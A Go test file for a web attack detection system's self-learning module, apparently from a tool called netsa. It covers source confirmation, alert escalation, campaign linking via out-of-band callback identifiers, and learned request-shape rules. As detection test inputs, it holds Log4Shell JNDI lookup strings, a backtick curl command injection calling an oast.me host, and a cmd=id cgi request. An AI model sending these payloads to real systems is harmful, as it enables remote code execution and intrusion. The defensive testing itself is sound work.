package learn

import (
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"netsa/internal/model"
)

func attackLearner(t *testing.T, path string) *Learner {
	t.Helper()
	l, err := Load(Options{Path: path, Escalate: true, EscalateDays: 30})
	if err != nil {
		t.Fatal(err)
	}
	return l
}

func webEv(ip, method, uri string, at time.Time) *model.Event {
	return &model.Event{Kind: model.KindWeb, SrcIP: ip, Method: method, URI: uri, Status: 200, Time: at}
}

// 自动确认的来源：低危 / 中危命中升一级，高危不再升；有效期过后、分析员之后判为误报的，不再升级。
func TestAutoConfirmEscalates(t *testing.T) {
	l := attackLearner(t, "")
	now := time.Date(2026, 11, 3, 10, 0, 0, 0, time.UTC)
	if !l.ConfirmSource("203.0.113.9", "evidence", "攻击成功且有证据：UNION联合查询注入", now) {
		t.Fatal("首次确认应返回 true")
	}
	if l.ConfirmSource("203.0.113.9", "ai", "再次确认", now.Add(time.Hour)) {
		t.Fatal("已确认的来源不重复确认")
	}
	hits := []model.Hit{{RuleID: "scan", Severity: model.SevLow}, {RuleID: "xss", Severity: model.SevMedium}, {RuleID: "sqli", Severity: model.SevHigh}}
	got := l.Calibrate(webEv("203.0.113.9", "GET", "/x", now.Add(24*time.Hour)), hits)
	if got[0].Severity != model.SevMedium || got[1].Severity != model.SevHigh || got[2].Severity != model.SevHigh {
		t.Fatalf("升级: %v %v %v", got[0].Severity, got[1].Severity, got[2].Severity)
	}
	if !strings.Contains(got[0].Evidence, "自动确认为攻击源") || got[0].Learned != 1 {
		t.Fatalf("证据应说明依据: %+v", got[0])
	}
	if hits[0].Severity != model.SevLow {
		t.Fatal("不能修改调用方的数据")
	}
	// 有效期（30 天）之后不再升级
	if got := l.Calibrate(webEv("203.0.113.9", "GET", "/x", now.Add(40*24*time.Hour)), hits); got[0].Severity != model.SevLow {
		t.Fatal("过期后不应升级")
	}
	// 其他来源不受影响
	if got := l.Calibrate(webEv("198.51.100.1", "GET", "/x", now), hits); got[0].Severity != model.SevLow {
		t.Fatal("未确认的来源不应升级")
	}
	// 分析员之后判为误报：以人的结论为准
	l.Feedback(Case{Incident: 7, Source: "203.0.113.9", Rules: map[string]int{"scan": 1}, Verdict: VerdictFP, User: "a", Time: now.Add(2 * time.Hour)})
	if got := l.Calibrate(webEv("203.0.113.9", "GET", "/x", now.Add(3*time.Hour)), hits); got[0].Severity != model.SevLow {
		t.Fatal("分析员判为误报之后不应再按自动确认升级")
	}
	// 关闭“确认攻击源复现升级”策略时不升级
	l2, _ := Load(Options{EscalateDays: 30})
	l2.ConfirmSource("203.0.113.9", "evidence", "x", now)
	if got := l2.Calibrate(webEv("203.0.113.9", "GET", "/x", now), hits); got[0].Severity != model.SevLow {
		t.Fatal("关闭复现升级时不应升级")
	}
}

// 模型高置信判为攻击才自动确认来源。
func TestAIConfirmsSource(t *testing.T) {
	l := attackLearner(t, "")
	now := time.Now()
	l.RecordAI(1, AIRecord{Verdict: "attack", Confidence: 70, Model: "m", Source: "203.0.113.1", Time: now})
	l.RecordAI(2, AIRecord{Verdict: "false_positive", Confidence: 95, Model: "m", Source: "203.0.113.2", Time: now})
	l.RecordAI(3, AIRecord{Verdict: "attack", Confidence: 90, Model: "m", Source: "203.0.113.3", Time: now})
	for ip, want := range map[string]bool{"203.0.113.1": false, "203.0.113.2": false, "203.0.113.3": true} {
		if _, ok := l.confirmedSource(ip, now); ok != want {
			t.Errorf("%s 确认=%v，期望 %v", ip, ok, want)
		}
	}
	r := l.Report()
	if r.Attack.AutoTotal != 1 || r.Attack.AutoSources[0].Kind != "ai" || !strings.Contains(r.Attack.AutoSources[0].Reason, "90%") {
		t.Fatalf("报告: %+v", r.Attack)
	}
}

// 带外回连标识：interactsh 用前 20 位关联 ID，经过 URL 编码也能识别。
func TestCallbackKey(t *testing.T) {
	for _, c := range []struct{ uri, want string }{
		{"/solr/admin/collections?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-837%7D.uri.dbke9n6cm7of64pa3q205ruzxb4wdym9x.oast.me%7D", "dbke9n6cm7of64pa3q20.oast"},
		{"/tos/index.php?path=`curl+http%3a//dbke9n6cm7of64pa3q2076hj7mss6qaf1.oast.me`", "dbke9n6cm7of64pa3q20.oast"},
		{"/x?u=http://abcd12.dnslog.cn/", "abcd12.dnslog.cn"},
		{"/index.php?id=1", ""},
	} {
		key, _, ok := callbackKey(webEv("1.1.1.1", "GET", c.uri, time.Now()))
		if key != c.want || ok != (c.want != "") {
			t.Errorf("%s: %q %v，期望 %q", c.uri, key, ok, c.want)
		}
	}
}

// 同一回连标识出现在多个来源：其中有已确认的攻击源时，其他来源一并确认；都没有确认时只记录活动。
func TestCampaignLinksSources(t *testing.T) {
	l := attackLearner(t, "")
	now := time.Now()
	atk := []model.Hit{{RuleID: "log4shell", Severity: model.SevHigh}}
	payload := func(n int) string {
		return "/?x=${jndi:ldap://dbke9n6cm7of64pa3q20" + strconv.Itoa(1000000000000+n) + ".oast.me/a}"
	}
	l.ObserveAttack(webEv("198.51.100.1", "GET", payload(1), now), atk)
	l.ObserveAttack(webEv("198.51.100.2", "GET", payload(2), now), atk)
	if _, ok := l.confirmedSource("198.51.100.2", now); ok {
		t.Fatal("活动中没有已确认的攻击源时不应扩散")
	}
	if r := l.Report(); len(r.Attack.Campaigns) != 1 || len(r.Attack.Campaigns[0].IPs) != 2 {
		t.Fatalf("应记录攻击活动: %+v", r.Attack.Campaigns)
	}
	l.ConfirmSource("198.51.100.1", "evidence", "有证据", now)
	l.ObserveAttack(webEv("198.51.100.3", "GET", payload(3), now), atk)
	for _, ip := range []string{"198.51.100.2", "198.51.100.3"} {
		if reason, ok := l.confirmedSource(ip, now); !ok || !strings.Contains(reason, "同一攻击活动") {
			t.Errorf("%s 应因同一攻击活动被确认: %q", ip, reason)
		}
	}
	// 没有命中攻击规则的请求不参与（回连标识必须出现在攻击载荷里）
	l.ObserveAttack(webEv("198.51.100.9", "GET", payload(9), now), nil)
	if _, ok := l.confirmedSource("198.51.100.9", now); ok {
		t.Fatal("没有攻击命中的请求不应关联")
	}
	// 供攻击活动归并：被多个来源使用过的标识
	if links := l.OASTLinks(); len(links) != 1 || len(links["dbke9n6cm7of64pa3q20.oast"]) != 3 {
		t.Fatalf("OAST 关联: %v", links)
	}
	// 写死在公开利用脚本里的标识：大量来源长期使用，不能说明是同一个人
	shared := func(ip string, at time.Time) {
		l.ObserveAttack(webEv(ip, "GET", "/?q=${jndi:ldap://${hostname}.abcd.dnslog.cn/x}", at), atk)
	}
	shared("192.0.2.1", now.Add(-30*24*time.Hour))
	shared("192.0.2.2", now)
	for i := range 40 {
		l.ObserveAttack(webEv("198.18.0."+strconv.Itoa(i+1), "GET", "/?q=${jndi:ldap://x.efgh.dnslog.cn/x}", now), atk)
	}
	if links := l.OASTLinks(); len(links) != 1 {
		t.Fatalf("长期、大量来源使用的标识不参与归并: %v", links)
	}
	var nilL *Learner
	if nilL.OASTLinks() != nil {
		t.Fatal("未启用自学习时为空")
	}
}

// 只出现在已确认攻击源、没有命中任何规则、正常访客从未使用的请求形态：3 个攻击源使用后生成观察规则。
func TestDiscoverUnknownAttack(t *testing.T) {
	path := filepath.Join(t.TempDir(), "learn.json")
	l := attackLearner(t, path)
	now := time.Now()
	attackers := []string{"203.0.113.1", "203.0.113.2", "203.0.113.3"}
	for _, ip := range attackers {
		l.ConfirmSource(ip, "evidence", "有证据", now)
	}
	// 正常访客用过的形态不能学
	l.ObserveAttack(webEv("198.51.100.50", "GET", "/api/orders?page=1", now), nil)
	for i, ip := range attackers {
		l.ObserveAttack(webEv(ip, "GET", "/api/orders?page="+strconv.Itoa(i), now), nil)
		l.ObserveAttack(webEv(ip, "POST", "/cgi-bin/x"+strconv.Itoa(0)+"/run.cgi?cmd_id="+strconv.Itoa(i)+"&token=abc", now), nil)
		// 静态资源不参与
		l.ObserveAttack(webEv(ip, "GET", "/static/app.js", now), nil)
	}
	if r := l.Report().Attack; len(r.Rules) != 0 {
		t.Fatalf("观察期（一小时）内不生成规则: %+v", r.Rules)
	}
	l.Refresh(now.Add(2 * time.Hour)) // 观察期满、攻击源没有再出现：定期刷新时生成
	r := l.Report().Attack
	if len(r.Rules) != 1 || r.Rules[0].Shape != "POST /cgi-bin/x0/run.cgi?cmd_id&token" || len(r.Rules[0].Sources) != 3 {
		t.Fatalf("应只为攻击者独有的形态生成规则: %+v", r.Rules)
	}
	id := r.Rules[0].ID
	// 之后任何来源使用该形态都会命中观察规则（低危）
	hits := l.ObserveAttack(webEv("198.51.100.77", "POST", "/cgi-bin/x0/run.cgi?token=z&cmd_id=99", now), nil)
	if len(hits) != 1 || hits[0].RuleID != id || hits[0].Severity != model.SevLow || hits[0].Category != CatLearned {
		t.Fatalf("应命中观察规则: %+v", hits)
	}
	// 停用后不再命中；重启后保留规则与停用状态
	if !l.SetLearnedRule(id, "admin", false) {
		t.Fatal("停用失败")
	}
	if hits := l.ObserveAttack(webEv("198.51.100.78", "POST", "/cgi-bin/x0/run.cgi?cmd_id=1&token=z", now), nil); len(hits) != 0 {
		t.Fatalf("停用后不应命中: %+v", hits)
	}
	if err := l.Save(); err != nil {
		t.Fatal(err)
	}
	l2 := attackLearner(t, path)
	r2 := l2.Report().Attack
	if len(r2.Rules) != 1 || !r2.Rules[0].Disabled || r2.AutoTotal != 3 {
		t.Fatalf("重启后应保留: %+v", r2)
	}
	if _, ok := l2.confirmedSource("203.0.113.1", now); !ok {
		t.Fatal("重启后自动确认的来源应保留")
	}
}

// 在被确认之前就用过这个形态的攻击源，不算正常访客。
func TestDiscoverIgnoresLaterConfirmed(t *testing.T) {
	l := attackLearner(t, "")
	now := time.Now()
	ips := []string{"203.0.113.11", "203.0.113.12", "203.0.113.13"}
	l.ObserveAttack(webEv(ips[2], "GET", "/vuln/probe.do?a=1", now), nil) // 当时还没确认
	for _, ip := range ips {
		l.ConfirmSource(ip, "ai", "模型判为攻击", now)
	}
	for _, ip := range ips[:2] {
		l.ObserveAttack(webEv(ip, "GET", "/vuln/probe.do?a=2", now), nil)
	}
	l.ObserveAttack(webEv(ips[2], "GET", "/vuln/probe.do?a=3", now.Add(2*time.Hour)), nil) // 观察期满后再次出现时生成
	if r := l.Report().Attack; len(r.Rules) != 1 {
		t.Fatalf("之后被确认的攻击源不应阻止学习: %+v", r)
	}
}

// 线上实例：三个员工出口地址被模型误判为攻击源，它们每隔几秒轮询的心跳接口 GET /uaa/api/ht/sid 被学成“未知攻击”，
// 一天多出上千条告警。被同一来源反复轮询的形态是业务接口：不学；已经学成的规则自动停用（管理员手动启用的保留）。
func TestDiscoverIgnoresPolling(t *testing.T) {
	l := attackLearner(t, "")
	now := time.Date(2026, 11, 6, 14, 0, 0, 0, time.UTC)
	office := []string{"101.231.58.190", "180.169.235.202", "180.169.235.203"}
	for _, ip := range office {
		l.ConfirmSource(ip, "ai", "模型判为攻击", now)
	}
	for i := range pollRepeat + 5 {
		for _, ip := range office {
			l.ObserveAttack(webEv(ip, "GET", "/uaa/api/ht/sid", now.Add(time.Duration(i)*10*time.Second)), nil)
		}
	}
	l.ObserveAttack(webEv(office[0], "GET", "/uaa/api/ht/sid", now.Add(2*time.Hour)), nil)
	l.Refresh(now.Add(3 * time.Hour))
	if r := l.Report().Attack; len(r.Rules) != 0 {
		t.Fatalf("被反复轮询的业务接口不应学成观察规则: %+v", r.Rules)
	}

	// 已经学成的规则（旧版本学到的）：被同一来源反复轮询后自动停用
	shape := "GET /uaa/api/ht/sid2"
	l.atk.mu.Lock()
	l.atk.rules[shape] = &LearnedRule{ID: "learn-4b5c24a2", Shape: shape, Sources: office, Time: now}
	l.atk.mu.Unlock()
	fired := 0
	for i := range pollRepeat + 5 {
		if hits := l.ObserveAttack(webEv("101.231.58.190", "GET", "/uaa/api/ht/sid2", now.Add(time.Hour+time.Duration(i)*5*time.Second)), nil); len(hits) > 0 {
			fired++
		}
	}
	r := l.Report().Attack
	if len(r.Rules) != 1 || !r.Rules[0].Disabled || !strings.Contains(r.Rules[0].AutoOff, "轮询") || fired != pollRepeat-1 {
		t.Fatalf("被轮询的观察规则应自动停用: fired=%d %+v", fired, r.Rules)
	}
	if !strings.Contains(r.Rules[0].AutoOff, "101.231.58.190") {
		t.Fatalf("停用原因应说明来源: %q", r.Rules[0].AutoOff)
	}
	// 管理员确认要继续观察：不再自动停用
	l.SetLearnedRule("learn-4b5c24a2", "admin", true)
	for i := range pollRepeat + 5 {
		l.ObserveAttack(webEv("101.231.58.190", "GET", "/uaa/api/ht/sid2", now.Add(2*time.Hour+time.Duration(i)*5*time.Second)), nil)
	}
	if r := l.Report().Attack; r.Rules[0].Disabled {
		t.Fatal("管理员启用的规则不应再自动停用")
	}
	// 扫描器每天跑一遍同样的探测：一小时内只有一两次，照常命中
	l.atk.mu.Lock()
	l.atk.rules["POST /cgi-bin/run.cgi?cmd"] = &LearnedRule{ID: "learn-1", Shape: "POST /cgi-bin/run.cgi?cmd", Time: now}
	l.atk.mu.Unlock()
	for d := range 30 {
		if hits := l.ObserveAttack(webEv("43.242.97.54", "POST", "/cgi-bin/run.cgi?cmd=id", now.Add(time.Duration(d)*24*time.Hour)), nil); len(hits) != 1 {
			t.Fatalf("第 %d 天的扫描应命中观察规则", d)
		}
	}
}

// 站点的常客（大量正常访问、攻击命中不到一成）：不凭模型的判断自动确认；已确认的在定期刷新时撤销。
func TestAIConfirmSkipsRegularUser(t *testing.T) {
	l := attackLearner(t, "")
	now := time.Now()
	l.ConfirmSource("180.169.235.202", "ai", "模型 m 以 85% 置信度判为攻击（事件 #425）", now)
	l.ConfirmSource("203.0.113.66", "evidence", "攻击成功且有证据", now)
	l.ConfirmSource("43.242.97.54", "ai", "模型 m 以 95% 置信度判为攻击（事件 #104）", now)
	regular := map[string]bool{"101.231.58.190": true, "180.169.235.202": true, "203.0.113.66": true}
	l.RegularUser = func(ip string) bool { return regular[ip] }
	l.RecordAI(68, AIRecord{Verdict: "attack", Confidence: 95, Model: "m", Source: "101.231.58.190", Time: now})
	if _, ok := l.confirmedSource("101.231.58.190", now); ok {
		t.Fatal("站点常客不应凭模型判断自动确认")
	}
	l.Refresh(now)
	for ip, want := range map[string]bool{"180.169.235.202": false, "203.0.113.66": true, "43.242.97.54": true} {
		if _, ok := l.confirmedSource(ip, now); ok != want {
			t.Errorf("%s 确认=%v，期望 %v（只撤销模型判断确认的常客，有证据的保留）", ip, ok, want)
		}
	}
	found := false
	for _, c := range l.Report().Changes {
		found = found || c.Kind == "revoke_auto" && strings.Contains(c.Detail, "180.169.235.202")
	}
	if !found {
		t.Fatal("撤销应写进化日志")
	}
}

func TestRequestShape(t *testing.T) {
	for _, c := range []struct{ method, uri, want string }{
		{"GET", "/api/user/12345/orders?id=9&page=2", "GET /api/user/{n}/orders?id&page"},
		{"GET", "/files/0123456789abcdef0123/download", "GET /files/{id}/download"},
		{"GET", "/", ""},
		{"GET", "/logo.PNG", ""},
		{"GET", "http://example.com/", ""},
	} {
		got, _ := requestShape(webEv("1.1.1.1", c.method, c.uri, time.Now()))
		if got != c.want {
			t.Errorf("%s %s: %q，期望 %q", c.method, c.uri, got, c.want)
		}
	}
}
